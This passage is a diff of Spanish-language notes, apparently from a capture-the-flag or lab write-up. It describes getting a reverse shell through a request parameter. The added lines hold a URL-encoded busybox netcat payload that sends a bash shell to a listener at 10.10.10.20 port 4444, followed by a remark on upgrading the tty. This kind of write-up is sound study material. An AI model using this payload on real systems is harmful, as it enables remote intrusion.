@@ -127,5 +127,15 @@ EL problema es que REQUEST puede ser tanto para POST,  como para GET (explicar l
 
 Asi que nos ponemos en escucha para obtener una reverse shell:
 
-Y enviamos el payload siguiente:
+Y enviamos el payload siguiente ya que sabemos que es un Debian
+(URL ENCODED):
+
+```
+busybox+nc+10.10.10.20+4444+-e+bash
+```
+
+
+![[Pasted image 20260824195518.png]]
+
+APLicamos la tty:
 
